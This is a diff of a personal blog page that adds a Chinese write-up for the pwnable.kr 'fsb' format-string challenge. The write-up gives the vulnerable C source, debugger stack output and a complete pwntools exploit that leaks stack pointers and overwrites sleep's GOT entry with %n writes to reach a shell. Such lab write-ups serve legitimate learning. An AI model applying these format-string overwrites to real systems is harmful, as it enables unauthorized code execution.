@@ -3,18 +3,18 @@
 <head>
   <meta charset="utf-8">
   
-  <title>0ctf writeup | GoldsNow</title>
+  <title>fsb pwnable | GoldsNow</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="0ctf是国际赛，这次参加比赛只做出了一道python逆向和两道密码题，有点小小忧伤">
+  <meta name="description" content="格式化字符串漏洞的利用">
 <meta property="og:type" content="article">
-<meta property="og:title" content="0ctf writeup">
+<meta property="og:title" content="fsb pwnable">
 <meta property="og:url" content="https://GoldsNow.github.io/2017/03/20/3-22 pwnable/index.html">
 <meta property="og:site_name" content="GoldsNow">
-<meta property="og:description" content="0ctf是国际赛，这次参加比赛只做出了一道python逆向和两道密码题，有点小小忧伤">
-<meta property="og:updated_time" content="2017-03-23T14:59:00.773Z">
+<meta property="og:description" content="格式化字符串漏洞的利用">
+<meta property="og:updated_time" content="2017-03-23T15:10:23.287Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="0ctf writeup">
-<meta name="twitter:description" content="0ctf是国际赛，这次参加比赛只做出了一道python逆向和两道密码题，有点小小忧伤">
+<meta name="twitter:title" content="fsb pwnable">
+<meta name="twitter:description" content="格式化字符串漏洞的利用">
   
     <link rel="alternative" href="/atom.xml" title="GoldsNow" type="application/atom+xml">
   
@@ -229,7 +229,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      0ctf writeup
+      fsb pwnable
     </h1>
   
 
@@ -254,7 +254,14 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        
+        <p>这个题目意思很明确，就是格式化字符串漏洞的利用</p>
+<p>我也是很早就知道的，但是就是不知到如何利用</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;alloca.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> key;</div><div class="line"><span class="keyword">char</span> buf[<span class="number">100</span>];</div><div class="line"><span class="keyword">char</span> buf2[<span class="number">100</span>];</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">fsb</span><span class="params">(<span class="keyword">char</span>** argv, <span class="keyword">char</span>** envp)</span></span>&#123;</div><div class="line">	<span class="keyword">char</span>* args[]=&#123;<span class="string">"/bin/sh"</span>, <span class="number">0</span>&#125;;</div><div class="line">	<span class="keyword">int</span> i;</div><div class="line"></div><div class="line">	<span class="keyword">char</span>*** pargv = &amp;argv;</div><div class="line">	<span class="keyword">char</span>*** penvp = &amp;envp;</div><div class="line">        <span class="keyword">char</span>** arg;</div><div class="line">        <span class="keyword">char</span>* c;</div><div class="line">        <span class="keyword">for</span>(arg=argv;*arg;arg++) <span class="keyword">for</span>(c=*arg; *c;c++) *c=<span class="string">'\0'</span>;</div><div class="line">        <span class="keyword">for</span>(arg=envp;*arg;arg++) <span class="keyword">for</span>(c=*arg; *c;c++) *c=<span class="string">'\0'</span>;</div><div class="line">	*pargv=<span class="number">0</span>;</div><div class="line">	*penvp=<span class="number">0</span>;</div><div class="line"></div><div class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">4</span>; i++)&#123;</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"Give me some format strings(%d)\n"</span>, i+<span class="number">1</span>);</div><div class="line">		read(<span class="number">0</span>, buf, <span class="number">100</span>);</div><div class="line">		<span class="built_in">printf</span>(buf);</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="built_in">printf</span>(<span class="string">"Wait a sec...\n"</span>);</div><div class="line">        sleep(<span class="number">3</span>);</div><div class="line"></div><div class="line">        <span class="built_in">printf</span>(<span class="string">"key : \n"</span>);</div><div class="line">        read(<span class="number">0</span>, buf2, <span class="number">100</span>);</div><div class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> pw = strtoull(buf2, <span class="number">0</span>, <span class="number">10</span>);</div><div class="line">        <span class="keyword">if</span>(pw == key)&#123;</div><div class="line">                <span class="built_in">printf</span>(<span class="string">"Congratz!\n"</span>);</div><div class="line">                execve(args[<span class="number">0</span>], args, <span class="number">0</span>);</div><div class="line">                <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="built_in">printf</span>(<span class="string">"Incorrect key \n"</span>);</div><div class="line">	<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>** envp)</span></span>&#123;</div><div class="line"></div><div class="line">	<span class="keyword">int</span> fd = open(<span class="string">"/dev/urandom"</span>, O_RDONLY);</div><div class="line">	<span class="keyword">if</span>( fd==<span class="number">-1</span> || read(fd, &amp;key, <span class="number">8</span>) != <span class="number">8</span> )&#123;</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"Error, tell admin\n"</span>);</div><div class="line">		<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">	&#125;</div><div class="line">	close(fd);</div><div class="line"></div><div class="line">	alloca(<span class="number">0x12345</span> &amp; key);</div><div class="line"></div><div class="line">	fsb(argv, envp); <span class="comment">// exploit this format string bug!</span></div><div class="line">	<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>但是这个buf是存在.bss段的，只能够利用ebp去用ebp，因为栈基指针ebp是指向上一个函数的ebp的，所以说才能够这样子的利用。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">.bss:0804A100 ; char buf[100]</div><div class="line">.bss:0804A100 buf             db 64h dup(?)           ; DATA XREF: fsb+C0o</div><div class="line">.bss:0804A100                                         ; fsb+D4o</div><div class="line">.bss:0804A100 _bss            ends</div><div class="line">.bss:0804A100</div></pre></td></tr></table></figure></p>
+<p>先来泄漏esp和ebp的指针<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">gdb-peda$ stack 20</div><div class="line">0000| 0xffffae20 --&gt; 0x804a100 (&quot;123\n&quot;)</div><div class="line">0004| 0xffffae24 --&gt; 0x804a100 (&quot;123\n&quot;)</div><div class="line">0008| 0xffffae28 --&gt; 0x64 (&apos;d&apos;)</div><div class="line">0012| 0xffffae2c --&gt; 0x0 </div><div class="line">0016| 0xffffae30 --&gt; 0x0 </div><div class="line">0020| 0xffffae34 --&gt; 0x0 </div><div class="line">0024| 0xffffae38 --&gt; 0x0 </div><div class="line">0028| 0xffffae3c --&gt; 0x0 </div><div class="line">0032| 0xffffae40 --&gt; 0x0 </div><div class="line">0036| 0xffffae44 --&gt; 0x8048870 (&quot;/bin/sh&quot;)</div><div class="line">0040| 0xffffae48 --&gt; 0x0 </div><div class="line">0044| 0xffffae4c --&gt; 0x0 </div><div class="line">0048| 0xffffae50 --&gt; 0xffffd2a4 --&gt; 0x0 </div><div class="line">0052| 0xffffae54 --&gt; 0xffffdfe1 --&gt; 0x6f682f00 (&apos;&apos;)</div><div class="line">0056| 0xffffae58 --&gt; 0xffffae70 --&gt; 0x0 </div><div class="line">0060| 0xffffae5c --&gt; 0xffffae74 --&gt; 0x0 </div><div class="line">0064| 0xffffae60 --&gt; 0x0 </div><div class="line">0068| 0xffffae64 --&gt; 0x0 </div><div class="line">0072| 0xffffae68 --&gt; 0xffffd108 --&gt; 0x0 </div><div class="line">0076| 0xffffae6c --&gt; 0x8048791 (&lt;main+178&gt;:	mov    eax,0x0)</div></pre></td></tr></table></figure></p>
+<p>可以查看$18x 和 $14x 用来分别得到ebp和esp</p>
+<p>最后附上能过远程的exp，最后的时候不知道为什么本地就不能过了，很气。。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line"></div><div class="line">#context(log_level = &quot;debug&quot;)</div><div class="line">#p = ssh(host=&apos;pwnable.kr&apos;,port=2222,user=&apos;fsb&apos;,password=&apos;guest&apos;).run(&apos;/home/fsb/fsb&apos;)</div><div class="line">p = process(&apos;./fsb&apos;)</div><div class="line"></div><div class="line">got_sleep = 0x0804a008</div><div class="line">addr_shell = 0x080486AB</div><div class="line"></div><div class="line">shellcode = &apos;%14$08x%18$08x&apos;</div><div class="line">p.recvuntil(&apos;(1)\n&apos;)</div><div class="line">p.sendline(shellcode)</div><div class="line">print &apos;step1&apos;</div><div class="line">esp = int(p.recv(8),16)-0x50</div><div class="line">ebp = int(p.recv(8),16)</div><div class="line">print &apos;esp = &apos;,esp</div><div class="line">print &apos;ebp = &apos;,ebp</div><div class="line">offset = (ebp - esp)/4</div><div class="line">print offset</div><div class="line">print &apos;step2&apos;</div><div class="line">shellcode = &apos;%0&apos;+str(got_sleep)+&apos;x%18$n&apos; #%0134520840x%18$n</div><div class="line">p.recvuntil(&apos;(2)\n&apos;)</div><div class="line">p.sendline(shellcode)</div><div class="line">print &apos;step3&apos;</div><div class="line">shellcode = &apos;%0&apos;+str(addr_shell)+&apos;x%&apos;+str(offset)+&apos;$n&apos;# %0134514347x%18550$n</div><div class="line">p.recvuntil(&apos;(3)\n&apos;)</div><div class="line">p.sendline(shellcode)</div><div class="line">print &apos;step4&apos;</div><div class="line">shellcode = &apos;111111111111111111111\x00&apos;</div><div class="line">p.recvuntil(&apos;(4)\n&apos;)</div><div class="line">p.sendline(shellcode)</div><div class="line">print &apos;ok&apos;</div><div class="line">p.recvuntil(&apos;sec...&apos;)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure></p>
+
       
       
     </div>
@@ -263,12 +270,12 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2017/03/20/3-22 pwnable/">0ctf writeup</a></p>
+        <p><span>本文标题:</span><a href="/2017/03/20/3-22 pwnable/">fsb pwnable</a></p>
         <p><span>文章作者:</span><a href="/" title="访问 GoldsNow 的个人博客">GoldsNow</a></p>
         <p><span>发布时间:</span>2017年03月20日 - 00时00分</p>
-        <p><span>最后更新:</span>2017年03月23日 - 22时59分</p>
+        <p><span>最后更新:</span>2017年03月23日 - 23时10分</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2017/03/20/3-22 pwnable/" title="0ctf writeup">https://GoldsNow.github.io/2017/03/20/3-22 pwnable/</a>
+            <span>原始链接:</span><a class="post-url" href="/2017/03/20/3-22 pwnable/" title="fsb pwnable">https://GoldsNow.github.io/2017/03/20/3-22 pwnable/</a>
             <span class="copy-path" data-clipboard-text="原文: https://GoldsNow.github.io/2017/03/20/3-22 pwnable/　　作者: GoldsNow" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script src="/js/clipboard.min.js"></script>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
@@ -291,11 +298,6 @@
       </div>
     </a>
   
-  
-    <a href="/2015/12/03/hello-world/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">Hello World</div>
-      <strong class="article-nav-caption">></strong>
-    </a>
   
 </nav>
 
@@ -350,12 +352,6 @@
 
 
     
-        <section class="youyan" id="comments">
-  <div id="uyan_frame"></div>
-  <script src="http://v2.uyan.cc/code/uyan.js?uid=2128370"></script>
-</section>
-
-    
 
 
 
@@ -367,12 +363,10 @@
         
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
         
-            <a href="/2015/12/03/hello-world/" title="下一篇: Hello World">
-                <i class="fa fa-angle-right"></i>
-            </a>
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
     </div>
-    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2017/03/20/writeup/">0ctf writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/20/3-22 pwnable/">0ctf writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/12/03/hello-world/">Hello World</a></li></ul>
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2017/03/20/writeup/">0ctf writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/20/3-22 pwnable/">fsb pwnable</a></li></ul>
     <script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
     <script>
         $(".post-list").addClass("toc-article");
@@ -447,27 +441,6 @@
 
 
 
-
-
-<script type="text/x-mathjax-config">
-MathJax.Hub.Config({
-    tex2jax: {
-        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
-        processEscapes: true,
-        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
-    }
-});
-
-MathJax.Hub.Queue(function() {
-    var all = MathJax.Hub.getAllJax(), i;
-    for(i=0; i < all.length; i += 1) {
-        all[i].SourceElement().parentNode.className += ' has-jax';                 
-    }       
-});
-</script>
-
-<script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
-</script>
 
 
 <div class="scroll" id="scroll">
